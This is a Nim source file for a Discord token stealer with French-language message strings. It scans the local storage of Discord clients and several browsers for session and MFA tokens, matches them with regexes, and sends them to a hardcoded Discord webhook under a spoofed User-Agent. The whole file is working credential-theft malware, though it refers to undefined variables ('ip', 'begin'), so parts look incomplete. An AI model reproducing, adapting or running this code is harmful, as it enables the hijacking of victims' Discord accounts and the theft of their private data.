import json, puppy, os, regex, strformat
from sequtils import deduplicate, concat
from strutils import replace, endswith, strip

let webhook = "https://discord.com/api/webhooks/1073928058794414130/zSLCsqFy_8A4RN2kG_A8uBp5cKyy-sleXLKbhOBwsvZ5yz80DgZMVK3VOoPCUNT_87jQ"

const
  embed: char = 'Y'

var
  tkpaths: seq[string] = @[]
  tokens: seq[string] = @[]
  hooktks = ""

let
  roaming = getenv("appdata")
  local = getenv("localappdata")
  user = getenv("username")

  paths = [
    roaming / "Discord",
    roaming / "discordcanary",
    roaming / "Lightcord",
    roaming / "discordptb",
    roaming / "Opera Software" / "Opera Stable",
    roaming / "Opera Software" / "Opera GX Stable",
    local / "Vivaldi" / "User Data" / "Default",
    local / "Microsoft" / "Edge" / "User Data" / "Default",
    local / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default",
    local / "Google" / "Chrome" / "User Data" / "Default",
    local / "Yandex" / "YandexBrowser" / "User Data" / "Default",
  ]

const reg = [re"(?i-u)[\w-]{24}\.[\w-]{6}\.[\w-]{27}", re"(?i-u)mfa\.[\w-]{84}"]

for path in paths:
  var path = path & r"\Local Storage\leveldb"
  if dirExists(path):
    try:
      setCurrentDir(path)
      for file in walkDirRec path:
        if file.endswith("log"):
          tkpaths.add(file)
        elif file.endswith("ldb"):
          tkpaths.add(file)
        else: continue
    except OSError: continue

    for file in tkpaths:
      var cont = file.readFile
      cont = cont.replace("\n", "")
      for r in reg:
        for f in findAll(cont, r):
          tokens.add cont[f.boundaries]
  else: continue

if tokens.len == 0:
  tokens.add("aucun tokens trouvés!")

tokens = tokens.deduplicate 
for c in tokens: hooktks.add(c & "\n")
hooktks = &"```\n{hooktks.strip(leading=false)}```"



when embed == 'Y':
  var data = %*{
      "username": "chat perdu",
      "embeds": [
          {
              "title": "[*] tokens trouvés",
              "fields": [
                  {
                      "name": "tokens totale: " & $tokens.len,
                      "value": hooktks
                  },
              ]
          },
          {
              "title": "[*] location",
              "fields": [
                  {
                      "name": "",
                      "value": ip
                  },
              ]
          }
      ]
  }
else:
  var data = %*{"content": begin & hooktks, "username": "chat perdu"}

let post = Request(
   url: parseUrl(webhook),
   verb: "POST",
   headers: @[Header(
      key: "Content-Type",
      value: "application/json"
  ), Header(
     key: "User-Agent",
     value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
  )],
  body: $data
)

try: discard fetch(post)
except PuppyError: discard